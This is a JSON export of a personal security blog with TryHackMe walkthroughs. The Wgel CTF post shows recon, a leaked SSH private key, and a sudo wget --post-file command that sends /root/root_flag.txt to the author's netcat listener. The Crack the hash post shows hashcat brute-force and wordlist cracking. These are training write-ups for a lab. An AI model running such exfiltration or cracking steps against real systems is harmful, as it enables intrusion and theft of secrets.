[{"content":"Intro Link to room: https://tryhackme.com/room/wgelctf\n User Flag nmap Scan First thing to always do is to run an nmap scan and check out the results.\n\u0026gt; nmap -sC -sV [ip] Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 09:13 EDT Nmap scan report for [ip] Host is up (0.039s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA) | 256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA) |_ 256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  So we have ports 22 and 80 open. So lets first check out the http server.\n Webpage We have the default Apache2 webpage.\nChecking the source code we can see a potential username:\n dirbuster We can now do a round of dirbuster to see any directories or files that we should look at. The results show a group of pages that follow /sitemap/\u0026hellip;\nChecking these pages out we see:\nWe should do a second round of dirbuster on this /sitemap/ directory to see if there is anything interesting. Dirbuster finds a url: /sitemap/.ssh/id_rsa - this is a key we can use to login through ssh.\n-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380 m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr +J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH ...   ssh Login We can copy \u0026amp; paste the key found into a file called key.txt. We then need to set the permissions of the file so that we can use it as a key. We can do this with:\nchmod 500 key.txt  Then supplying the key with the -i parameter and using the username \u0026ldquo;jessie\u0026rdquo; that was found in the source code, we can login through ssh:\n\u0026gt; ssh jessie@[ip] -i key.txt Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 8 packages can be updated. 8 updates are security updates. jessie@CorpOne:~$   Finding The Flag We a bit of traversal through the directories on the machine, we can find the file.\njessie@CorpOne:~$ ls Desktop Documents Downloads examples.desktop Music Pictures Public Templates Videos jessie@CorpOne:~$ cd Documents/ jessie@CorpOne:~/Documents$ ls user_flag.txt jessie@CorpOne:~/Documents$   Root Flag Sudo Permissions After gaining access to a system, the first thing to check in order to privilege escalate is the commands that we have sudo permissions for. This can be done with: sudo -l.\njessie@CorpOne:~/Documents$ sudo -l Matching Defaults entries for jessie on CorpOne: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User jessie may run the following commands on CorpOne: (ALL : ALL) ALL (root) NOPASSWD: /usr/bin/wget jessie@CorpOne:~/Documents$  From the results, we can see that we can run wget with sudo permissions so we should do some research on how to leverage this.\n GTFOBins on wget GTFOBins is a great site that lists the methods to leverage and perform privilege escalation. This is the listing for wget: https://gtfobins.github.io/gtfobins/wget/\nSo we can do a file upload of the root flag file to retrieve its contents.\n Performing The Exploit Firstly, we need to setup a listener for the file we are going to send. We can do this with netcat like so:\n\u0026gt; nc -lvnp 4445 listening on [any] 4445 ...  We are ready to retrieve the file on port 4445.\nFollowing the instructions from GTFOBins, we can set up the attack like this:\njessie@CorpOne:/$ URL=[my-ip]:4445 jessie@CorpOne:/$ LFILE=/root/root_flag.txt jessie@CorpOne:/$ sudo wget --post-file=$LFILE $URL  We get:\njessie@CorpOne:/$ sudo wget --post-file=$LFILE $URL --2021-04-18 16:49:15-- http://[my-ip]:4445/ Connecting to [my-ip]:4445... connected. HTTP request sent, awaiting response...  On our listening machine we have been sent the flag!\n\u0026gt; nc -lvnp 4445 listening on [any] 4445 ... connect to [my-ip] from (UNKNOWN) [ip] 53770 POST / HTTP/1.1 User-Agent: Wget/1.17.1 (linux-gnu) Accept: */* Accept-Encoding: identity Host: [my-ip]:4445 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Content-Length: 33 b1b968b...[Redacted] \u0026lt;-Flag.  ","permalink":"https://ascrivins.github.io/posts/tryhackme/wgel_ctf/","summary":"Intro Link to room: https://tryhackme.com/room/wgelctf\n User Flag nmap Scan First thing to always do is to run an nmap scan and check out the results.\n\u0026gt; nmap -sC -sV [ip] Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 09:13 EDT Nmap scan report for [ip] Host is up (0.039s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.","title":"[TryHackMe] Wgel CTF - Walkthrough"},{"content":"Intro Link to room: https://tryhackme.com/room/crackthehash\n Note: Some of the hashes will take a long time to crack.\n  Level 1 Hash 1: 48bb6e862e54f2a795ffc4e541caed4d This hash can be cracked by using a online tool to search through a database of cracked hashes.\n Head to: https://hashes.com/en/decrypt/hash Copy in the hash and press Submit. This gives us the result and algorithm:   48bb6e862e54f2a795ffc4e541caed4d:[Redacted]:MD5\n Hash 2: CBFDAC6008F9CAB4083784CBD\u0026hellip; This hash can be cracked by using a online tool to search through a database of cracked hashes.\n Head to: https://hashes.com/en/decrypt/hash Copy in the hash and press Submit. This gives us the result and algorithm:   cbfdac6008f9cab4083784cbd1874f76618d2a97:[Redacted]:SHA1\n Hash 3: 1C8BFE8F801D79745C4631D09F\u0026hellip; This hash can be cracked by using a online tool to search through a database of cracked hashes.\n Head to: https://hashes.com/en/decrypt/hash Copy in the hash and press Submit. This gives us the result and algorithm:   1c8bfe8f801d79745c4631d09fff36c82aa37fc4cce4fc946683d7b336b63032:[Redacted]:SHA256PLAIN\n Hash 4: $2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUz\u0026hellip; This is where it gets a little more tricky. Using the online tool doesn\u0026rsquo;t yield any results so we need to crack the hash.\nFirstly, we need to identify the algorithm. We can do this with the Hash Identifier tool on hashes.com.\nThis gives the result:\nPossible algorithms: bcrypt $2*$, Blowfish (Unix)  We can look up the hashcat mode for this algorithm here: https://hashcat.net/wiki/doku.php?id=example_hashes\nHashcat Mode #: 3200\nThen running this through Hashcat with the command:\nhashcat -a 3 -m 3200 blowfish.txt ?l?l?l?l  where:\n -a 3 is attack mode=3 which is brute force -m 3200 is the mode for Bycrpt Blowfish blowfish.txt is the file containing just the hash ?l?l?l?l specifies it\u0026rsquo;s a 4 letter word with char a-z  Gives result:\n$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom:[Redacted] Session..........: hashcat Status...........: Cracked Hash.Name........: bcrypt $2*$, Blowfish (Unix) Hash.Target......: $2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX...8wsRom Time.Started.....: Sat Apr 17 06:46:13 2021 (1 min, 35 secs) Time.Estimated...: Sat Apr 17 06:47:48 2021 (0 secs) Guess.Mask.......: bl?l?l [4] Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 6 H/s (9.64ms) @ Accel:2 Loops:64 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 604/676 (89.35%) Rejected.........: 0/604 (0.00%) Restore.Point....: 600/676 (88.76%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4032-4096 Candidates.#1....: bleh -\u0026gt; bllz   Hash 5: 279412f945939ba78ce0758d3fd83daa Here we can return to using a online tool to search through a database of cracked hashes.\n Head to: https://hashes.com/en/decrypt/hash Copy in the hash and press Submit. This gives us the result and algorithm:   279412f945939ba78ce0758d3fd83daa:[Redacted]:900\n Level 2 Hash 6: F09EDCB1FCEFC6DFB23DC3505A882\u0026hellip; This hash can be cracked by using a online tool to search through a database of cracked hashes.\n Head to: https://hashes.com/en/decrypt/hash Copy in the hash and press Submit. This gives us the result and algorithm:   f09edcb1fcefc6dfb23dc3505a882655ff77375ed8aa2d1c13f640fccc2d0c85:[Redacted]:SHA256PLAIN\n Hash 7: 1DFECA0C002AE40B8619ECF94\u0026hellip; This hash can be cracked by using a online tool to search through a database of cracked hashes.\n Head to: https://hashes.com/en/decrypt/hash Copy in the hash and press Submit. This gives us the result and algorithm:   1dfeca0c002ae40b8619ecf94819cc1b:[Redacted]:NTLM\n Hash 8: $6$aReallyHardSalt$6WKUTqzq.U\u0026hellip; Salt: aReallyHardSalt \u0026amp; Rounds: 5\nFirstly, we need to identify the algorithm. We can do this with the Hash Identifier tool on hashes.com.\nThis gives the result:\nPossible algorithms: sha512crypt $6$, SHA512 (Unix)  We can look up the hashcat mode for this algorithm here: https://hashcat.net/wiki/doku.php?id=example_hashes\nHashcat Mode #: 1800 - sha512crypt\nThen running this through Hashcat with the command:\nhashcat -m 1800 hash.hash wordlists/rockyou.txt  where:\n -m 1800 is the mode for sha512crypt hash.hash is the file containing just the hash wordlists/rockyou.txt is the dictionary to check against.  Gives result:\n$6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPMAXi4bJMl9be.cfi3/qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02.:[Redacted] Session..........: hashcat Status...........: Cracked Hash.Name........: sha512crypt $6$, SHA512 (Unix) Hash.Target......: $6$aReallyHardSalt$6WKUTqzq.UQQmrm0p/T7MPpMbGNnzXPM...ZAs02. Time.Started.....: Fri Apr 16 10:25:11 2021 (1 hour, 17 mins) Time.Estimated...: Fri Apr 16 11:42:52 2021 (0 secs) Guess.Base.......: File (wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 685 H/s (9.52ms) @ Accel:32 Loops:512 Thr:1 Vec:4 Recovered........: 1/1 (100.00%) Digests Progress.........: 2831936/14344385 (19.74%) Rejected.........: 0/2831936 (0.00%) Restore.Point....: 2831872/14344385 (19.74%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4608-5000 Candidates.#1....: wakaguma -\u0026gt; wak3Board   Hash 9: e5d8870e5bdd26602cab8dbe07a942\u0026hellip; Salt: tryhackme\nFirstly, we need to identify the algorithm. We can do this with the Hash Identifier tool:\nThis gives the result:\n HASH: e5d8870e5bdd26602cab8dbe07a942c8669e56d6 Possible Hashs: [+] SHA-1 [+] MySQL5 - SHA-1(SHA-1($pass))  The hint tells us the algorithm is HMAC-SHA1 so the identifier is not being helpful here. Hashcat Mode #: 160 - HMAC-SHA1\n Note: The mode is not 110 as the other walkthroughs say. ;)\n Then running this through Hashcat with the command:\nhashcat -m 160 sha1.txt wordlists/rockyou.txt  where:\n -m 160 is the mode for HMAC-SHA1 hash.hash is the file containing: hash:salt wordlists/rockyou.txt is the dictionary to check against.  Gives Result:\ne5d8870e5bdd26602cab8dbe07a942c8669e56d6:tryhackme:[Redacted] Session..........: hashcat Status...........: Cracked Hash.Name........: HMAC-SHA1 (key = $salt) Hash.Target......: e5d8870e5bdd26602cab8dbe07a942c8669e56d6:tryhackme Time.Started.....: Fri Apr 16 10:19:57 2021 (7 secs) Time.Estimated...: Fri Apr 16 10:20:04 2021 (0 secs) Guess.Base.......: File (wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 1570.3 kH/s (0.82ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests Progress.........: 12314624/14344385 (85.85%) Rejected.........: 0/12314624 (0.00%) Restore.Point....: 12312576/14344385 (85.84%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates.#1....: 48162450 -\u0026gt; 481101133 ","permalink":"https://ascrivins.github.io/posts/tryhackme/htm_crack_the_hash/","summary":"Intro Link to room: https://tryhackme.com/room/crackthehash\n Note: Some of the hashes will take a long time to crack.\n  Level 1 Hash 1: 48bb6e862e54f2a795ffc4e541caed4d This hash can be cracked by using a online tool to search through a database of cracked hashes.\n Head to: https://hashes.com/en/decrypt/hash Copy in the hash and press Submit. This gives us the result and algorithm:   48bb6e862e54f2a795ffc4e541caed4d:[Redacted]:MD5\n Hash 2: CBFDAC6008F9CAB4083784CBD\u0026hellip; This hash can be cracked by using a online tool to search through a database of cracked hashes.","title":"[TryHackMe] Crack the hash - Walkthrough"},{"content":"Blog created today to document some things that happen in my realm of cybersecurity.\n","permalink":"https://ascrivins.github.io/posts/first_post/","summary":"Blog created today to document some things that happen in my realm of cybersecurity.","title":"Hello World!"}]